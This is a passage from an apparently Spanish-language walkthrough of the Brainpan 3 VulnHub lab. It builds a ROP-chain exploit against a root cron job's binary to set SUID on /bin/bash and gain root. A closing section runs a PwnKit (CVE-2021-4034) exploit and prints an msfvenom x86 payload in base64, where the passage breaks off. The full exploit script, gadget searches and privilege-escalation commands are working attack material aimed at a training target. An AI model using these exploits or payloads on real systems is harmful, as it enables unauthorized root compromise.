+<p class="plain-text">Corremos el programa en <code class="language-plaintext highlighter-rouge">gdb</code> con el nuevo <code class="language-plaintext highlighter-rouge">exploit.msg</code> como segundo argumento, lo que conseguimos con lo anterior es que en el <code class="language-plaintext highlighter-rouge">EIP</code> quede <code class="language-plaintext highlighter-rouge">0x43434343</code> que equivale a <code class="language-plaintext highlighter-rouge">CCCC</code> osea la primera parte de la segunda linea del archivo msg</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ gdb </span><span class="p">-q msg_admin
+Reading symbols from </span><span class="ve">msg_admin</span><span class="p">...
+(No debugging symbols found in </span><span class="ve">msg_admin</span><span class="p">)
+</span><span class="ro">pwndbg> </span><span class="p">run 1 exploit.msg
+Starting program: </span><span class="ve">/home/kali/msg_admin </span><span class="p">1 exploit.msg  
+[+] Recording 2 entries
+
+Program received signal SIGSEGV, Segmentation fault.
+</span><span class="az">0x43434343 </span><span class="p">in </span><span class="am">??</span><span class="p"> ()
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya que no tenemos un leak de libc tendremos que buscar otra forma de llegar a <code class="language-plaintext highlighter-rouge">system</code>, para ello creamos un pequeño script que busque posibles <code class="language-plaintext highlighter-rouge">funciones</code> dentro del propio binario y su diferencia con la funcion <code class="language-plaintext highlighter-rouge">system</code> de libc</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="mi">*</span><span class="p">
+
+elf </span><span class="o">= </span><span class="p">ELF(</span><span class="s">'./msg_admin'</span><span class="p">, checksec</span><span class="o">=</span><span class="mi">False</span><span class="p">)
+libc </span><span class="o">= </span><span class="p">ELF(</span><span class="s">'./libc.so.6'</span><span class="p">, checksec</span><span class="o">=</span><span class="mi">False</span><span class="p">)
+
+</span><span class="o">for </span><span class="p">symbol </span><span class="o">in </span><span class="p">elf.symbols.keys():
+    </span><span class="o">try</span><span class="p">:
+        </span><span class="o">if </span><span class="p">libc.symbols[symbol] </span><span class="o">< </span><span class="p">libc.symbols[</span><span class="s">'system'</span><span class="p">]:
+            log.info(</span><span class="no">f</span><span class="s">"</span><span class="p">{symbol}</span><span class="s">: </span><span class="p">{</span><span class="no">hex</span><span class="p">(libc.symbols[</span><span class="s">'system'</span><span class="p">] </span><span class="o">- </span><span class="p">libc.symbols[symbol])}</span><span class="s">"</span><span class="p">)  
+    </span><span class="o">except</span><span class="p">:
+        </span><span class="o">pass</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La funcion mas cercana a system es <code class="language-plaintext highlighter-rouge">atol</code> la cual tiene de diferencia solo <code class="language-plaintext highlighter-rouge">0xe900</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> exploit.py
+[</span><span class="az">*</span><span class="p">] plt.malloc: 0x28e10
+[</span><span class="az">*</span><span class="p">] __libc_start_main: 0x26800  
+[</span><span class="az">*</span><span class="p">] atol: 0xe900</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Usaremos la funcion <code class="language-plaintext highlighter-rouge">atol</code> como base asi que primero tomaremos su direccion <code class="language-plaintext highlighter-rouge">got</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg> </span><span class="p">got -r atol
+Filtering by symbol name: </span><span class="am">atol</span><span class="p">
+
+State of the GOT of</span><span class="sa"> /home/kali/msg_admin</span><span class="p">:
+GOT protection: </span><span class="am">Partial RELRO</span><span class="p"> | Found </span><span class="am">1 </span><span class="p">GOT entries passing the filter  
+[</span><span class="sa">0x804b04c</span><span class="p">] </span><span class="am">atol@GLIBC_2.0</span><span class="p"> -> </span><span class="ro">0x80486b6 (atol@plt+6)</span><span class="p"> ◂— </span><span class="na">push </span><span class="mi">0x80
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para la diferencia podemos buscar direcciones para <code class="language-plaintext highlighter-rouge">0xe800</code> y <code class="language-plaintext highlighter-rouge">0x100</code> que sumados suman <code class="language-plaintext highlighter-rouge">0xe900</code> lo cual equivale a que sumandole atol tendriamos un posible <code class="language-plaintext highlighter-rouge">system</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg> </span><span class="p">search 0xe800 msg_admin -t dword
+Searching for value: b'\x00\xe8\x00\x00'
+</span><span class="ro">msg_admin       0x80480c7 </span><span class="na">add </span><span class="no">al</span><span class="p">, </span><span class="no">ch
+</span><span class="ro">pwndbg> </span><span class="p">search 0x100 msg_admin -t dword
+Searching for value: b'\x00\x01\x00\x00'
+</span><span class="ro">msg_admin       0x8048013 </span><span class="na">add </span><span class="no">byte ptr </span><span class="p">[</span><span class="no">ecx</span><span class="p">],</span><span class="no"> al  </span><span class="p">
+</span><span class="ro">msg_admin       0x804806f </span><span class="na">add </span><span class="no">byte ptr </span><span class="p">[</span><span class="no">ecx</span><span class="p">],</span><span class="no"> al  </span><span class="p">
+</span><span class="ro">msg_admin       0x8048073 </span><span class="na">add </span><span class="no">byte ptr </span><span class="p">[</span><span class="no">ecx</span><span class="p">],</span><span class="no"> al  </span><span class="p">
+</span><span class="ro">msg_admin       0x8048093 </span><span class="na">add </span><span class="no">byte ptr </span><span class="p">[</span><span class="no">ecx</span><span class="p">],</span><span class="no"> al  </span><span class="p">
+</span><span class="ro">msg_admin       0x804814f </span><span class="na">add </span><span class="no">byte ptr </span><span class="p">[</span><span class="no">ecx</span><span class="p">],</span><span class="no"> al  </span><span class="p">
+</span><span class="ro">msg_admin       0x804816f </span><span class="na">add </span><span class="no">byte ptr </span><span class="p">[</span><span class="no">ecx</span><span class="p">],</span><span class="no"> al  </span><span class="p">
+</span><span class="ro">msg_admin       0x80481b3 </span><span class="na">add </span><span class="no">byte ptr </span><span class="p">[</span><span class="no">ecx</span><span class="p">],</span><span class="no"> al  </span><span class="p">
+</span><span class="ro">msg_admin       0x8048477 </span><span class="na">add </span><span class="no">byte ptr </span><span class="p">[</span><span class="no">ecx</span><span class="p">],</span><span class="no"> al  </span><span class="p">
+</span><span class="ro">msg_admin       0x804847f </span><span class="na">add </span><span class="no">byte ptr </span><span class="p">[</span><span class="no">ecx</span><span class="p">],</span><span class="no"> al  </span><span class="p">
+</span><span class="ro">msg_admin       0x8049f13 </span><span class="na">add </span><span class="no">byte ptr </span><span class="p">[</span><span class="no">ecx</span><span class="p">],</span><span class="no"> al  </span><span class="p">
+</span><span class="ro">msg_admin       0x8049f17 </span><span class="na">add </span><span class="no">byte ptr </span><span class="p">[</span><span class="no">ecx</span><span class="p">],</span><span class="no"> al  </span><span class="p">
+msg_admin       0x804af13 0x100
+msg_admin       0x804af17 0x100
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora necesitamos un archivo el cual ejecutar con <code class="language-plaintext highlighter-rouge">system</code>, encontramos una direccion hacia <code class="language-plaintext highlighter-rouge">/tmp/foo</code> que usaremos para ejecutar <code class="language-plaintext highlighter-rouge">system("/tmp/foo")</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg> </span><span class="p">search /tmp/foo
+Searching for value: '/tmp/foo'
+</span><span class="ro">msg_admin       0x8048eef </span><span class="na">das</span><span class="p">  /* '/tmp/foo' */
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">ropper</code> podemos encontrar un par de gadgets que llamaran a <code class="language-plaintext highlighter-rouge">EAX</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ropper </span><span class="p">--file msg_admin --jmp eax  
+
+JMP Instructions
+================
+
+</span><span class="ro">0x08048786</span><span class="p">: </span><span class="am">call </span><span class="p">eax</span><span class="az">;
+</span><span class="ro">0x0804880f</span><span class="p">: </span><span class="am">call </span><span class="p">eax</span><span class="az">;
+</span><span class="p">
+2 gadgets found</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Tambien necesitaremos limpiar <code class="language-plaintext highlighter-rouge">EAX</code>, en la funcion llamada <code class="language-plaintext highlighter-rouge">register_tm_clones</code> encontramos un par de instrucciones que nos ayudaran a limiar el registro <code class="language-plaintext highlighter-rouge">EAX</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg> </span><span class="p">x/2i register_tm_clones
+   </span><span class="az">0x8048790 </span><span class="p">&lt</span><span class="am">register_tm_clones</span><span class="p">>:	</span><span class="ve">mov    </span><span class="ro">eax</span><span class="p">,</span><span class="az">0x804b074
+   </span><span class="az">0x8048795 </span><span class="p">&lt</span><span class="am">register_tm_clones</span><span class="p">+5>:	</span><span class="ve">sub    </span><span class="ro">eax</span><span class="p">,</span><span class="az">0x804b074
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">ropper</code> podemos buscar un gadget que nos ejecute un <code class="language-plaintext highlighter-rouge">add eax</code>, encontramos uno que ejecuta <code class="language-plaintext highlighter-rouge">add eax, dword ptr [ebx + 0x1270304]; ret;</code> que nos servira</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ropper</span><span class="p"> --file msg_admin --search </span><span class="am">"add eax"</span><span class="p">
+</span><span class="ve">[INFO] </span><span class="p">Load gadgets from cache
+</span><span class="ve">[LOAD] </span><span class="p">loading... 100%
+</span><span class="ve">[LOAD] </span><span class="p">removing double gadgets... 100%
+</span><span class="ve">[INFO] </span><span class="p">Searching for gadgets: add eax
+
+</span><span class="ve">[INFO] </span><span class="p">File: msg_admin
+</span><span class="ro">0x080489ba</span><span class="p">: </span><span class="am">add </span><span class="p">eax, 0x14</span><span class="az">; </span><span class="am">je </span><span class="p">0x9c6</span><span class="az">; </span><span class="am">call </span><span class="p">0x600</span><span class="az">; </span><span class="am">leave</span><span class="az">; </span><span class="am">ret</span><span class="az">;
+</span><span class="ro">0x08048aa7</span><span class="p">: </span><span class="am">add </span><span class="p">eax, 0x14</span><span class="az">; </span><span class="am">je </span><span class="p">0xab3</span><span class="az">; </span><span class="am">call </span><span class="p">0x600</span><span class="az">; </span><span class="am">leave</span><span class="az">; </span><span class="am">ret</span><span class="az">;
+</span><span class="ro">0x08048aad</span><span class="p">: </span><span class="am">add </span><span class="p">eax, 0xfffb4de8</span><span class="az">; </span><span class="am">dec </span><span class="p">ecx</span><span class="az">; </span><span class="am">ret</span><span class="az">;
+</span><span class="ro">0x080489c0</span><span class="p">: </span><span class="am">add </span><span class="p">eax, 0xfffc3ae8</span><span class="az">; </span><span class="am">dec </span><span class="p">ecx</span><span class="az">; </span><span class="am">ret</span><span class="az">;
+</span><span class="ro">0x08048942</span><span class="p">: </span><span class="am">add </span><span class="p">eax, 0xfffcb8e8</span><span class="az">; </span><span class="am">inc </span><span class="p">dword ptr [ebx + 0x5f5b80ec]</span><span class="az">; </span><span class="am">pop </span><span class="p">ebp</span><span class="az">; </span><span class="am">ret</span><span class="az">;  
+</span><span class="ro">0x08048feb</span><span class="p">: </span><span class="am">add </span><span class="p">eax, dword ptr [ebx + 0x1270304]</span><span class="az">; </span><span class="am">ret</span><span class="az">;
+</span><span class="ro">0x080487a2</span><span class="p">: </span><span class="am">add </span><span class="p">eax, edx</span><span class="az">; </span><span class="p">sar eax, 1</span><span class="az">; </span><span class="am">jne </span><span class="p">0x7a9</span><span class="az">; </span><span class="am">ret</span><span class="az">;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sin embargo para usarlo tambien necesitaremos otro gadget que ejecute un <code class="language-plaintext highlighter-rouge">pop ebx</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ropper</span><span class="p"> --file msg_admin --search </span><span class="am">"pop ebx; ret;"</span><span class="p">  
+</span><span class="ve">[INFO] </span><span class="p">Load gadgets from cache
+</span><span class="ve">[LOAD] </span><span class="p">loading... 100%
+</span><span class="ve">[LOAD] </span><span class="p">removing double gadgets... 100%
+</span><span class="ve">[INFO] </span><span class="p">Searching for gadgets: pop ebx; ret;
+
+</span><span class="ve">[INFO] </span><span class="p">File: msg_admin
+</span><span class="ro">0x0804859d</span><span class="p">: </span><span class="am">pop </span><span class="p">ebx</span><span class="az">; </span><span class="am">ret</span><span class="az">;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El ultimo gadget que necesitaremos sera uno que ejecute un <code class="language-plaintext highlighter-rouge">stack pivot</code> para terminar con el <code class="language-plaintext highlighter-rouge">ret</code>, este lo usaremos como puntero en el inicio de la segunda linea</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ropper </span><span class="p">--file msg_admin --stack-pivot
+</span><span class="ve">[INFO] </span><span class="p">Load gadgets from cache
+</span><span class="ve">[LOAD] </span><span class="p">loading... 100%
+</span><span class="ve">[LOAD] </span><span class="p">removing double gadgets... 100%
+
+Gadgets
+=======
+
+</span><span class="ro">0x08048ddc</span><span class="p">: </span><span class="am">pop </span><span class="p">ebx</span><span class="az">; </span><span class="am">pop </span><span class="p">esi</span><span class="az">; </span><span class="am">pop </span><span class="p">edi</span><span class="az">; </span><span class="am">pop </span><span class="p">ebp</span><span class="az">; </span><span class="am">ret</span><span class="az">;  
+</span><span class="ro">0x0804859a</span><span class="p">: </span><span class="am">add </span><span class="p">esp, 8; </span><span class="am">pop </span><span class="p">ebx</span><span class="az">; </span><span class="am">ret</span><span class="az">; 
+</span><span class="ro">0x08048c5e</span><span class="p">: </span><span class="am">ret </span><span class="p">0</span><span class="az">;
+</span><span class="ro">0x08048c09</span><span class="p">: </span><span class="am">ret </span><span class="p">0x458b</span><span class="az">;</span><span class="p">
+</span><span class="ro">0x08048a33</span><span class="p">: </span><span class="am">ret </span><span class="p">0x8941</span><span class="az">;
+</span><span class="ro">0x080488e4</span><span class="p">: </span><span class="am">ret </span><span class="p">0xb8</span><span class="az">;
+</span><span class="ro">0x0804879e</span><span class="p">: </span><span class="am">ret </span><span class="p">0xeac1</span><span class="az">;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Iniciemos con el exploit, como en la maquina no tenemos pwntools definiremos la funcion <code class="language-plaintext highlighter-rouge">p32</code> haciendo uso de la libreria struct para convertir la direccion</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">p32 </span><span class="o">= lambda </span><span class="am">addr</span><span class="p">: struct.pack(</span><span class="s">"I"</span><span class="p">, addr)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Lo siguiente sera una funcion que nos haga el <code class="language-plaintext highlighter-rouge">add</code>, enviando a <code class="language-plaintext highlighter-rouge">ebx</code> la direccion menos <code class="language-plaintext highlighter-rouge">0x1270304</code> para asi compensar las instrucciones del gadget encontrado antes</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">def </span><span class="na">add</span><span class="p">(</span><span class="am">addr</span><span class="p">):
+    result  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
+    result </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0x0804859d</span><span class="p">)
+    result </span><span class="o">+= </span><span class="p">p32(addr </span><span class="o">- </span><span class="mi">0x1270304</span><span class="p">)
+    result </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0x08048feb</span><span class="p">)
+    </span><span class="o">return </span><span class="p">result</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nuestra cadena rop simplemente limpiara <code class="language-plaintext highlighter-rouge">eax</code>, y con atol sumando la diferencia conseguiremos <code class="language-plaintext highlighter-rouge">system</code> que como argumento tendra la direccion de <code class="language-plaintext highlighter-rouge">/tmp/foo</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">rop  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
+rop </span><span class="o">+= </span><span class="p">p32(eax_0)
+rop </span><span class="o">+= </span><span class="p">add(got_atol)
+rop </span><span class="o">+= </span><span class="p">add(diff_e800) </span><span class="o">+ </span><span class="p">add(diff_100)
+rop </span><span class="o">+= </span><span class="p">p32(call_eax)
+rop </span><span class="o">+= </span><span class="p">p32(tmp_foo)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La variable shellcode sera el segundo argumento de la primera linea, asi que despues de <code class="language-plaintext highlighter-rouge">rop</code> rellenaremos con <code class="language-plaintext highlighter-rouge">A's</code> hasta los <code class="language-plaintext highlighter-rouge">212</code> bytes, despues enviaremos el got de la funcion <code class="language-plaintext highlighter-rouge">strtok</code> que dejara en <code class="language-plaintext highlighter-rouge">EIP</code> el primer argumento de la segunda linea</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">shellcode  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="p">rop
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">(offset </span><span class="o">- </span><span class="no">len</span><span class="p">(shellcode))
+shellcode </span><span class="o">+= </span><span class="p">p32(got_strtok)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La primer linea de muestro .msg seran <code class="language-plaintext highlighter-rouge">4 A's</code> en el primer argumento y el <code class="language-plaintext highlighter-rouge">shellcode</code> en el segundo, en la segunda linea sera el <code class="language-plaintext highlighter-rouge">pop4_ret</code> que quedara en el <code class="language-plaintext highlighter-rouge">EIP</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
+payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="mi">10</span><span class="p">
+payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"|"</span><span class="p">
+payload </span><span class="o">+= </span><span class="p">shellcode</span><span class="p">
+payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\n</span><span class="s">"</span><span class="p">
+
+payload </span><span class="o">+= </span><span class="p">p32(pop4_ret)
+payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"|"</span><span class="p">
+payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="mi">10</span><span class="p">
+payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\n</span><span class="s">"</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Como lo que haremos sera un <code class="language-plaintext highlighter-rouge">system("/tmp/foo")</code> en ese archivo escribiremos un comando que en caso de ejecutarse como root otorgara privilegios <code class="language-plaintext highlighter-rouge">suid</code> a la <code class="language-plaintext highlighter-rouge">bash</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">command </span><span class="o">= </span><span class="no">b</span><span class="s">"chmod u+s /bin/bash"
+
+</span><span class="o">with </span><span class="no">open</span><span class="p">(</span><span class="s">"/tmp/foo"</span><span class="p">, </span><span class="s">"wb"</span><span class="p">) </span><span class="o">as </span><span class="p">file:
+    file.write(command)
+
+os.chmod(</span><span class="s">"/tmp/foo"</span><span class="p">, </span><span class="mi">0o755</span><span class="p">)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Resumiendo, nuestro <code class="language-plaintext highlighter-rouge">payload</code> para ejecutar el system sera el segundo argumento de la primera linea, rellenaremos y en el puntero enviaremos <code class="language-plaintext highlighter-rouge">strtok</code> para que como puntero quede el primer argumento de la segunda linea, este sera el <code class="language-plaintext highlighter-rouge">pop4_ret</code> que volvera a nuestro payload y ejecutara <code class="language-plaintext highlighter-rouge">/tmp/foo</code> que dara suid a la bash</p>
+<a href="/vulnhub/brainpan3/12.png" target="_blank"><div><p><img src="/vulnhub/brainpan3/12.png"></p></div></a>
+
+<p class="plain-text">El <code class="language-plaintext highlighter-rouge">script</code> final para explotar la tarea cron seria el siguiente, este creara los archivos <code class="language-plaintext highlighter-rouge">exploit.msg</code> y <code class="language-plaintext highlighter-rouge">/tmp/foo</code> que seran ejecutados al ejecutarse la tarea que vimos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">import </span><span class="p">struct, os
+
+p32 </span><span class="o">= lambda </span><span class="am">addr</span><span class="p">: struct.pack(</span><span class="s">"I"</span><span class="p">, addr)
+
+</span><span class="o">def </span><span class="na">add</span><span class="p">(</span><span class="am">addr</span><span class="p">):
+    result  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
+    result </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0x0804859d</span><span class="p">)
+    result </span><span class="o">+= </span><span class="p">p32(addr </span><span class="o">- </span><span class="mi">0x1270304</span><span class="p">)
+    result </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0x08048feb</span><span class="p">)
+    </span><span class="o">return </span><span class="p">result
+
+offset </span><span class="o">= </span><span class="mi">212
+</span><span class="p">
+pop4_ret </span><span class="o">= </span><span class="mi">0x08048ddc
+</span><span class="p">
+eax_0 </span><span class="o">= </span><span class="mi">0x8048790</span><span class="p">
+call_eax </span><span class="o">= </span><span class="mi">0x8048786
+</span><span class="p">
+got_strtok </span><span class="o">= </span><span class="mi">0x804b05c</span><span class="p">
+got_atol </span><span class="o">= </span><span class="mi">0x804b04c</span><span class="p">
+tmp_foo </span><span class="o">= </span><span class="mi">0x8048eef</span><span class="p">
+
+diff_e800 </span><span class="o">= </span><span class="mi">0x80480c7</span><span class="p">
+diff_100 </span><span class="o">= </span><span class="mi">0x8048013</span><span class="p">
+
+rop  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
+rop </span><span class="o">+= </span><span class="p">p32(eax_0)
+rop </span><span class="o">+= </span><span class="p">add(got_atol)
+rop </span><span class="o">+= </span><span class="p">add(diff_e800) </span><span class="o">+ </span><span class="p">add(diff_100)
+rop </span><span class="o">+= </span><span class="p">p32(call_eax)
+rop </span><span class="o">+= </span><span class="p">p32(tmp_foo)
+
+shellcode  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="p">rop
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">(offset </span><span class="o">- </span><span class="no">len</span><span class="p">(shellcode))
+shellcode </span><span class="o">+= </span><span class="p">p32(got_strtok)
+
+payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
+payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="mi">10</span><span class="p">
+payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"|"</span><span class="p">
+payload </span><span class="o">+= </span><span class="p">shellcode</span><span class="p">
+payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\n</span><span class="s">"</span><span class="p">
+
+payload </span><span class="o">+= </span><span class="p">p32(pop4_ret)
+payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"|"</span><span class="p">
+payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="mi">10</span><span class="p">
+payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\n</span><span class="s">"
+
+</span><span class="o">with </span><span class="no">open</span><span class="p">(</span><span class="s">"/opt/.messenger/exploit.msg"</span><span class="p">, </span><span class="s">"wb"</span><span class="p">) </span><span class="o">as </span><span class="p">file:
+    file.write(payload)
+
+command </span><span class="o">= </span><span class="no">b</span><span class="s">"chmod u+s /bin/bash"
+
+</span><span class="o">with </span><span class="no">open</span><span class="p">(</span><span class="s">"/tmp/foo"</span><span class="p">, </span><span class="s">"wb"</span><span class="p">) </span><span class="o">as </span><span class="p">file:
+    file.write(command)
+
+os.chmod(</span><span class="s">"/tmp/foo"</span><span class="p">, </span><span class="mi">0o755</span><span class="p">)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ejecutamos el script como <code class="language-plaintext highlighter-rouge">puck</code> y pasados unos minutos interpreta nuestro payload y la <code class="language-plaintext highlighter-rouge">bash</code> se vuelve suid, ahora simplemente ejecutamos <code class="language-plaintext highlighter-rouge">bash -p</code> y somos root</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">puck@brainpan3</span><span class="p">:</span><span class="az">~</span><span class="p">$ python3 exploit.py
+</span><span class="ve">puck@brainpan3</span><span class="p">:</span><span class="az">~</span><span class="p">$ ls -l /bin/bash
+-rwxr-xr-x 1 root root 986672 Oct  7  2014 </span><span class="ve">/bin/bash</span><span class="p">
+</span><span class="ve">puck@brainpan3</span><span class="p">:</span><span class="az">~</span><span class="p">$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 986672 Oct  7  2014 </span><span class="err">/bin/bash</span><span class="p">  
+</span><span class="ve">puck@brainpan3</span><span class="p">:</span><span class="az">~</span><span class="p">$ bash -p
+bash-4.3# id
+uid=0(root) gid=0(root) groups=0(root)
+bash-4.3# hostname -I
+192.168.100.64
+bash-4.3#</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En /root encontramos un archivo <code class="language-plaintext highlighter-rouge">.gz</code> que al descomprimirlo nos da la <code class="language-plaintext highlighter-rouge">flag</code> final</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">root@brainpan3</span><span class="p">:</span><span class="az">~</span><span class="p"># ls
+</span><span class="ro">brainpan.8.gz
+</span><span class="ve">root@brainpan3</span><span class="p">:</span><span class="az">~</span><span class="p"># gzip -d brainpan.8.gz 
+</span><span class="ve">root@brainpan3</span><span class="p">:</span><span class="az">~</span><span class="p"># cat brainpan.8 
+.TH man 8 "20 May 2015" "3.0" "brainpan 3"
+
+.SH DESCRIPTION
+Congratulations, you win! Thanks for playing!
+
+.SH FLAG
+.B
+flag{tricksy-hobbitses-use-unix}
+
+.SH BUGS
+You found them all. 
+
+.SH AUTHOR
+superkojiman - 
+.B
+http://blog.techorganic.com
+
+.SH TESTERS
+Special thanks go to barrebas and Swappage taking the time to test Brainpan 3!  
+.br
+barrebas - 
+.B
+https://twitter.com/barrebas
+.br
+Swappage - 
+.B
+https://twitter.com/Swappage
+</span><span class="ve">root@brainpan3</span><span class="p">:</span><span class="az">~</span><span class="p">#</span>
+</code></pre></div></div><br>
+
+</section>
+<section class="post" id="extra-root">
+<br><h3 class="post-title">Extra - root</h3><br>
+
+<p class="plain-text">Antes cuando buscamos por binarios <code class="language-plaintext highlighter-rouge">suid</code> veiamos que el binario <code class="language-plaintext highlighter-rouge">pkexec</code> lo era</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">anansi@brainpan3</span><span class="p">:</span><span class="az">~</span><span class="p">$ ls -l /usr/bin/pkexec
+-rwsr-xr-x 1 root root 18168 Feb 11  2014 </span><span class="err">/usr/bin/pkexec</span><span class="p">  
+</span><span class="ve">anansi@brainpan3</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sin embargo al ejecutar un <a href="https://github.com/joeammond/CVE-2021-4034">exploit</a> del pwnkit, nos devuelve un error, esto es debido a que el <code class="language-plaintext highlighter-rouge">payload</code> del exploit es de arquitectura <code class="language-plaintext highlighter-rouge">x64</code> y el sistema aqui es <code class="language-plaintext highlighter-rouge">x86</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">anansi@brainpan3</span><span class="p">:</span><span class="az">~</span><span class="p">$ python3 CVE-2021-4034.py
+[+] Creating shared library for exploit code.
+[+] Calling execve()
+GLib: Cannot convert message: Conversion from character set 'UTF-8' to 'ANSI_X3.4-1968' is not supported  
+The value for environment variable XAUTHORITY contains suscipious content
+
+This incident has been reported.
+</span><span class="ve">anansi@brainpan3</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">msfvenom</code> podemos crear un payload en <code class="language-plaintext highlighter-rouge">x86</code> que nos ejecute una <code class="language-plaintext highlighter-rouge">/bin/bash</code>, la data en base64 la modificaremos en el exploit en la variable <code class="language-plaintext highlighter-rouge">payload</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ msfvenom </span><span class="p">-p linux/x86/exec CMD=/bin/bash -f elf-so PrependSetuid=true | </span><span class="ve">base64</span><span class="p">
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload  
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 52 bytes
+Final size of elf-so file: 298 bytes
+
+f0VMRgEBAQAAAAAAAAAAAAMAAwABAAAA9gAAADQAAAB0AAAAAAAAADQAIAACACgAAgABAAEAAAAA
+AAAAAAAAAAAAAAAqAQAAXgEAAAcAAAAAEAAAAgAAAAcAAADEAAAAxAAAAMQAAAAwAAAAMAAAAAAQ
+AAABAAAABgAAAAAAAADEAAAAxAAAADAAAAAAAAAAAAAAAAgAAAAHAAAAAAAAAAMAAAAAAAAA9AAA
